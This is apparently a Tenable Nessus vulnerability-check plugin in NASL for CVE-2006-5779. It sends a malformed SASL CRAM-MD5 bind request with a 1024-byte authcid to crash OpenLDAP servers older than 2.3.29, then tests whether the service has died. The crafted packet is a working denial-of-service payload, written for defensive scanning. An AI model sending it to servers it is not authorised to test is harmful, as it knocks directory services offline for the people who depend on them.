#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(23625);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-5779");
  script_bugtraq_id(20939);
  script_osvdb_id(30226);

  script_name(english:"OpenLDAP SASL authcid Name BIND Request DoS");
  script_summary(english:"Tries to crash OpenLDAP");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote LDAP server is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running OpenLDAP, an open source LDAP
directory implementation. 

The version of OpenLDAP installed on the remote host fails to handle
malformed SASL bind requests.  An unauthenticated attacker can
leverage this issue to crash the LDAP server on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/450728/30/0/threaded" );
  # http://www.openldap.org/its/index.cgi/Archive.Software%20Bugs?id=4740;expression=authcid%20Name%20BIND%20Request;selectid=4740;usearchives=1
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9daf484d" );
 script_set_attribute(attribute:"see_also", value:"http://www.openldap.org/software/release/changes.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to OpenLDAP 2.3.29 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/11/07");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/11/06");
 script_cvs_date("$Date: 2016/05/12 14:46:29 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:openldap:openldap");
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");
  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 389);

  exit(0);
}

include("global_settings.inc");
include("byte_func.inc");
include("misc_func.inc");


port = get_service(svc:"ldap", default: 389, exit_on_fail: 1);


soc = open_sock_tcp(port);
if (!soc) exit(0);


id = rand() % 1024;

set_byte_order(BYTE_ORDER_BIG_ENDIAN);
req_bind1 =
  mkbyte(0x30) +                       # universal sequence
  mkbyte(0x17) +                       # length of the request
  mkbyte(2) + mkbyte(2) + mkword(id) + # message id (random)
  mkbyte(0x60) +                       # bind request
    mkbyte(0x11) +                     #   length of request
    mkbyte(2) +                        #   version (3)
      mkbyte(1) + mkbyte(3) +
    mkbyte(4) +                        #   authentication (SASL)
      mkbyte(0) +
      mkbyte(0xa3) +
      mkbyte(10) +
      mkbyte(4) + mkbyte(8) + "CRAM-MD5";
send(socket:soc, data:req_bind1);
res = recv(socket:soc, length:1024);

# If...
if (
  # the response is long enough and..
  strlen(res) > 5 &&
  # it looks like an LDAP message and...
  getbyte(blob:res, pos:0) == 0x30 &&
  # it's a response to our request.
  (mkword(id) + mkbyte(0x61)) >< res
)
{
  # Try to kill the server.
  id = id - 1;
  req_bind2 =
    mkbyte(0x30) +                     # universal sequence
    mkbyte(0x82) + mkword(0x041f) +    # length of the request
    mkbyte(2) + mkbyte(2) + mkword(id) + # message id (random)
    mkbyte(0x60) +                     # bind request
      mkbyte(0x82) + mkword(0x0417) +  #   length of request
      mkbyte(2) +                      #  version (3)
        mkbyte(1) + mkbyte(3) + 
      mkbyte(4) +                        #   authentication (SASL)
      mkbyte(0) +
      mkbyte(0xa3) +
        mkbyte(0x82) + mkword(0x040e) + 
      mkbyte(4) + mkbyte(8) + "CRAM-MD5" + 
      mkbyte(4) + mkbyte(0x82) + mkword(0x0400) + crap(data:" ", length:1024);
  send(socket:soc, data:req_bind2);
  res = recv(socket:soc, length:1024);
  close(soc);

  # If we didn't get a response, try to open another connection.
  if (strlen(res) == 0)
  {
    sleep(1);
    if (service_is_dead(port: port) > 0)
    {
      security_warning(port);
      exit(0);
    }
  }
}
